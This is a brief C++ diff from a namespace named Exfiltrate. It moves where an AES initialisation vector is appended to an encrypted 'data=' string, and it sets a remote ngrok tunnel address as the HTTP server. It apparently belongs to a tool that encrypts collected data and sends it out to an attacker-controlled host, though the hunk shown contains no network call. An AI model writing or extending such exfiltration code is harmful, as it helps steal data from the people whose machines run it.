@@ -36,8 +36,8 @@ namespace Exfiltrate
 
 		std::string sendData = "data=";
 		
-		sendData += Transformer::getIV();
 		sendData += Transformer::aesEncrypt(formattedData.str());
+		sendData += Transformer::getIV();
 
 		std::string httpServerAddress = "7cf3-2601-2c7-4300-ac0-cdcc-8fde-b845-bef0.ngrok.io";
 
